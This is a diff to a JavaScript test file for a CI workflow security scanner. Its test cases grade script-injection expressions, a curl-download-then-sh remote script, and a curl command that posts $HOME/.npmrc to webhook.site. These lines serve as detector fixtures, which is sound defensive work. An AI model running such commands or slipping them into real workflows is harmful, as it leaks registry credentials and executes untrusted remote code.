@@ -191,6 +191,12 @@ describe('a script\'s findings, graded', () => {
     assert.deepEqual(graded('docker run alpine\ndocker run node:20\ndocker pull node@sha256:' + 'c'.repeat(64)), ['unpinned-image/high@11', 'unpinned-image/moderate@12'])
   })
 
+  it('a fork\'s repository\'s description, which its owner writes, and a script saved by curl\'s -o joined to its file', () => {
+    assert.deepEqual(graded('echo "${{ github.event.pull_request.head.repo.description }}"\necho "${{ github.event.workflow_run.head_repository.homepage }}"'),
+      ['script-injection/high@11', 'script-injection/high@12'])
+    assert.deepEqual(graded('curl -fsSLo/tmp/setup https://x/s.sh && sh /tmp/setup\nwget -qO- https://x/a.txt'), ['remote-script/high@11'])
+  })
+
   it('services that exfiltrate, by risk\'s tags, and expressions anyone can write', () => {
     assert.deepEqual(graded('curl -d @$HOME/.npmrc https://webhook.site/x\ncurl https://ipinfo.io'), ['hosts/critical@11', 'hosts/moderate@12'])
     assert.deepEqual(graded('echo "${{ github.event.issue.title }}"\necho "${{ github.sha }}"'), ['script-injection/high@11'])
